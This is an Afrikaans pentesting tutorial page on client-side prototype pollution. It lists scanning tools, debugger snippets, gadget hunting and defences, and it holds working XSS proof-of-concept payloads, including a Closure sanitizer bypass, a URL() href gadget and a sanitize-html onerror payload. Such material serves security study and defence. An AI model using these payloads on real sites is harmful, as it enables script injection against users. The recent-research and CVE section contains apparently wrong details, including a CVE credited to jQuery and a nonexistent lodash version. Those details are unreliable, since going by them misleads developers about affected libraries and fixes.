# Kliëntkant Prototipe Besoedeling

{{#include ../../../banners/hacktricks-training.md}}

## Ontdekking met outomatiese gereedskap

Die gereedskap [**https://github.com/dwisiswant0/ppfuzz**](https://github.com/dwisiswant0/ppfuzz?tag=v1.0.0)**,** [**https://github.com/kleiton0x00/ppmap**](https://github.com/kleiton0x00/ppmap) **en** [**https://github.com/kosmosec/proto-find**](https://github.com/kosmosec/proto-find) kan gebruik word om **prototipe besoedeling kwesbaarhede** te **vind**.

Boonop kan jy ook die **blaaier uitbreiding** [**PPScan**](https://github.com/msrkp/PPScan) gebruik om **outomaties** die **bladsye** wat jy **toegang** het vir prototipe besoedeling kwesbaarhede te **skandeer**.

### Foutopsporing waar 'n eienskap gebruik word <a href="#id-5530" id="id-5530"></a>
```javascript
// Stop debugger where 'potentialGadget' property is accessed
Object.defineProperty(Object.prototype, "potentialGadget", {
__proto__: null,
get() {
console.trace()
return "test"
},
})
```
### Vind die oorsaak van Prototype Pollution <a href="#id-5530" id="id-5530"></a>

Sodra 'n prototype pollution kwesbaarheid deur enige van die gereedskap geïdentifiseer is, en as die kode nie te kompleks is nie, kan jy die kwesbaarheid vind deur te soek na sleutelwoorde soos `location.hash`, `decodeURIComponent`, of `location.search` in die Chrome Developer Tools. Hierdie benadering stel jou in staat om die kwesbare gedeelte van die JavaScript-kode te lokaliseer.

Vir groter en meer komplekse kodebasisse, behels 'n eenvoudige metode om die kwesbare kode te ontdek die volgende stappe:

1. Gebruik 'n gereedskap om 'n kwesbaarheid te identifiseer en verkry 'n payload wat ontwerp is om 'n eienskap in die konstruktors te stel. 'n Voorbeeld wat deur ppmap verskaf word, kan soos volg lyk: `constructor[prototype][ppmap]=reserved`.
2. Stel 'n breekpunt op die eerste lyn van JavaScript-kode wat op die bladsy sal uitvoer. Vernuw die bladsy met die payload, en pauze die uitvoering by hierdie breekpunt.
3. Terwyl die JavaScript-uitvoering gepouseer is, voer die volgende skrip in die JS-konsol uit. Hierdie skrip sal aandui wanneer die 'ppmap' eienskap geskep word, wat help om die oorsprong daarvan te lokaliseer:
```javascript
function debugAccess(obj, prop, debugGet = true) {
var origValue = obj[prop]

Object.defineProperty(obj, prop, {
get: function () {
if (debugGet) debugger
return origValue
},
set: function (val) {
debugger
origValue = val
},
})
}

debugAccess(Object.prototype, "ppmap")
```
4. Navigeer terug na die **Sources** oortjie en kies “Resume script execution”. Die JavaScript sal voortgaan om uit te voer, en die 'ppmap' eienskap sal soos verwag besoedel word. Deur die verskafde snit te gebruik, kan die presiese plek waar die 'ppmap' eienskap besoedel word, geïdentifiseer word. Deur die **Call Stack** te ondersoek, kan verskillende stakke waar die besoedeling plaasgevind het, waargeneem word.

Wanneer jy besluit watter stap om te ondersoek, is dit dikwels nuttig om stakke te teiken wat met JavaScript-biblioteeklêers geassosieer word, aangesien prototipe besoedeling dikwels binne hierdie biblioteke voorkom. Identifiseer die relevante stap deur dit aan biblioteeklêers te koppel (sigbaar aan die regterkant, soortgelyk aan 'n beeld wat vir leiding verskaf). In scenario's met verskeie stakke, soos dié op lyne 4 en 6, is die logiese keuse die stap op lyn 4, aangesien dit die aanvanklike voorkoms van besoedeling verteenwoordig en dus die wortel oorsaak van die kwesbaarheid. Deur op die stap te klik, sal jy na die kwesbare kode gelei word.

![https://miro.medium.com/max/1400/1*S8NBOl1a7f1zhJxlh-6g4w.jpeg](https://miro.medium.com/max/1400/1*S8NBOl1a7f1zhJxlh-6g4w.jpeg)

## Vind Script Gadgets

Die gadget is die **kode wat misbruik sal word sodra 'n PP kwesbaarheid ontdek word**.

As die aansoek eenvoudig is, kan ons **soek** na **sleutelwoorde** soos **`srcdoc/innerHTML/iframe/createElement`** en die brondokument hersien en kyk of dit l**ead tot javascript uitvoering**. Soms mag die genoem tegnieke glad nie gadgets vind nie. In daardie geval, onthul 'n suiwer brondokument hersiening 'n paar mooi gadgets soos die onderstaande voorbeeld.

### Voorbeeld Vind PP gadget in Mithil biblioteek kode

Kyk na hierdie skrywe: [https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/](https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/)

## Herkompilering van payloads vir kwesbare biblioteke

- [https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution)
- [https://github.com/BlackFan/client-side-prototype-pollution](https://github.com/BlackFan/client-side-prototype-pollution)

## HTML Sanitizers omseil via PP

[**Hierdie navorsing**](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/) toon PP gadgets om te gebruik om **die sanitisasies** wat deur sommige HTML sanitizers biblioteke verskaf word, te **omseil**:

- **sanitize-html**

<figure><img src="../../../images/image (1140).png" alt="https://research.securitum.com/wp-content/uploads/sites/2/2020/08/image-7.png"><figcaption></figcaption></figure>

- **dompurify**

<figure><img src="../../../images/image (1141).png" alt="https://research.securitum.com/wp-content/uploads/sites/2/2020/08/image-9.png"><figcaption></figcaption></figure>

- **Closure**
```html
<!-- from https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/ -->
<script>
Object.prototype['* ONERROR'] = 1;
Object.prototype['* SRC'] = 1;
</script>
<script src=https://google.github.io/closure-library/source/closure/goog/base.js></script>
<script>
goog.require('goog.html.sanitizer.HtmlSanitizer');
goog.require('goog.dom');
</script>
<body>
<script>
const html = '<img src onerror=alert(1)>';
const sanitizer = new goog.html.sanitizer.HtmlSanitizer();
const sanitized = sanitizer.sanitize(html);
const node = goog.dom.safeHtmlToNode(sanitized);

document.body.append(node);
</script>
```
## Nuwe Gereedskap & Outomatisering (2023–2025)

* **Burp Suite DOM Invader (v2023.6)** – PortSwigger het 'n toegewyde *Prototype-pollution* oortjie bygevoeg wat outomaties parametername (bv. `__proto__`, `constructor.prototype`) muteer en besoedelde eienskappe by sinkpunte binne die blaaierspesie detecteer. Wanneer 'n gadget geaktiveer word, wys DOM Invader die uitvoeringsstapel en die presiese lyn waar die eienskap gedereferensieer is, wat handmatige breekpuntjag onnodig maak. Kombineer dit met die "Break on property access" snit wat hierbo gewys is om vinnig van *bron → sink* te pivot.
* **protoStalker** – 'n oopbron Chrome DevTools-plug-in (vrygestel 2024) wat prototipe kettings in werklike tyd visualiseer en skrywe na wêreldwyd gevaarlike sleutels soos `onerror`, `innerHTML`, `srcdoc`, `id`, ens. merk. Nuttig wanneer jy net 'n produksiepakket het en nie die bou-stap kan instrumenteer nie.
* **ppfuzz 2.0 (2025)** – die gereedskap ondersteun nou ES-modules, HTTP/2 en WebSocket eindpunte. Die nuwe `-A browser` modus draai 'n headless Chromium-instansie op en tel outomaties gadget klasse op deur DOM API's te bruteforce (sien afdeling hieronder).

---

## Onlangse Prototype-Pollution Gadget Navorsing (2022–2025)

In middel 2023 het PortSwigger navorsers 'n artikel gepubliseer wat toon dat *blaaier-geboude* objekte in betroubare XSS gadgets omskep kan word sodra dit besoedel is. Omdat hierdie objekte op **elke** bladsy teenwoordig is, kan jy uitvoering verkry selfs al raak die teiken toepassing kode nooit die besoedelde eienskap nie.

Voorbeeld gadget (werk in alle evergreen blaaiers ≥ 2023-04):
```html
<script>
// Source (e.g. https://victim/?__proto__[href]=javascript:alert(document.domain))
// For demo we just pollute manually:
Object.prototype.href = 'javascript:alert(`polluted`)' ;

// Sink – URL() constructor implicitly reads `href`
new URL('#'); // breaks into JS; in Chrome you get an alert, Firefox loads "javascript:" URL
</script>
```
Ander nuttige globale gadgets wat bevestig is dat dit werk na besoedeling (getoets 2024-11):

| Gadget klas | Lees eienskap | Primitive bereik |
|-------------|---------------|------------------|
| `Notification` | `title` | `alert()` via kennisgewing klik |
| `Worker` | `name` | JS uitvoering in toegewyde Worker |
| `Image` | `src` | Tradisionele `onerror` XSS |
| `URLSearchParams` | `toString` | DOM-gebaseerde Open Redirect |

Sien die PortSwigger papier vir die volledige lys van 11 gadgets en 'n bespreking oor sandbox ontsnappings.

---

## Opmerklike Kliënt-Sy PP CVE's (2023-2025)

* **DOMPurify ≤ 3.0.8 – CVE-2024-45801**  'n Aanvaller kon `Node.prototype.after` besoedel voordat die sanitizer geinitialiseer is, wat die *SAFE_FOR_TEMPLATES* profiel omseil en lei tot gestoor XSS. Die verskaffer het reggemaak deur `Object.hasOwn()` kontroles en `Object.create(null)` vir interne kaarte te gebruik.
* **jQuery 3.6.0-3.6.3 – CVE-2023-26136 / CVE-2023-26140**  `extend()` kon gebruik word op vervaardigde voorwerpe wat afkomstig is van `location.hash`, wat arbitrêre eienskappe in `Object.prototype` in die blaai konteks bekendstel.
* **sanitize-html < 2.8.1 (2023-10) prototype besoedeling**  'n Kwaadwillige eienskaplys soos `{"__proto__":{"innerHTML":"<img/src/onerror=alert(1)>"}}` het die toelaat lys omseil.

Selfs al woon die kwesbare biblioteek **slegs op die kliënt**, is die gevolglike XSS steeds op afstand exploiteerbaar deur middel van weerspieëlde parameters, postMessage handlers of gestoor data wat later gerender word.

---

## Moderne Verdedigingsmaatreëls

1. **Bevries die globale prototipe vroeg** (ideaal as die eerste skrip):
```javascript
Object.freeze(Object.prototype);
Object.freeze(Array.prototype);
Object.freeze(Map.prototype);
```
Wees bewus dat dit polyfills kan breek wat op laat uitbreiding staatmaak.
2. Gebruik `structuredClone()` in plaas van `JSON.parse(JSON.stringify(obj))` of gemeenskaplike "deepMerge" snippette – dit ignoreer setters/getters en loop nie die prototipe ketting nie.
3. Wanneer jy regtig diep samensmelt funksionaliteit nodig het, kies **lodash ≥ 4.17.22** of **deepmerge ≥ 5.3.0** wat ingeboude prototipe sanitasie het.
4. Voeg 'n Content-Security-Policy by met `script-src 'self'` en 'n strenge nonce. Terwyl CSP nie alle gadgets sal stop nie (bv. `location` manipulasie), blokkeer dit die meerderheid van `innerHTML` sinks.


## Verwysings

- [https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746](https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746)
- [https://blog.s1r1us.ninja/research/PP](https://blog.s1r1us.ninja/research/PP)
- [https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/#:\~:text=my%20challenge.-,Closure,-Closure%20Sanitizer%20has](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/)
- [https://portswigger.net/research/widespread-prototype-pollution-gadgets](https://portswigger.net/research/widespread-prototype-pollution-gadgets)
- [https://snyk.io/blog/dompurify-prototype-pollution-bypass-cve-2024-45801/](https://snyk.io/blog/dompurify-prototype-pollution-bypass-cve-2024-45801/)

- [https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746](https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746)
- [https://blog.s1r1us.ninja/research/PP](https://blog.s1r1us.ninja/research/PP)
- [https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/#:\~:text=my%20challenge.-,Closure,-Closure%20Sanitizer%20has](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/)

{{#include ../../../banners/hacktricks-training.md}}
